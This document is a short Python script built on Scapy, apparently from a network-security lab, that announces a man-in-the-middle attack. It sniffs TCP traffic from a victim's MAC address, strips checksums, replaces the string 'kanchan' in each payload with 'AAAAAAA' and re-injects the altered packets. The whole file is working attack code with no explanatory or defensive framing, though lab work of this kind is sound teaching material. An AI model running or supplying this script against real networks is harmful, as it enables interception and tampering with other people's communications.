#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
   newpkt = IP(bytes(pkt[IP]))
   del(newpkt.chksum)
   del(newpkt[TCP].payload)
   del(newpkt[TCP].chksum)

   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace a pattern
       newdata = data.replace(b'kanchan', b'AAAAAAA')

       send(newpkt/newdata)
   else: 
       send(newpkt)

#f = 'tcp and not src host 10.9.0.111 and host 10.9.0.5' //with A'IP address
f = 'tcp and not src host 10.9.0.111'
mac_filter='ether src 02:42:0a:09:00:05' #with A's MAC address
pkt = sniff(iface='eth0', filter= f + ' and ' + mac_filter, prn=spoof_pkt)

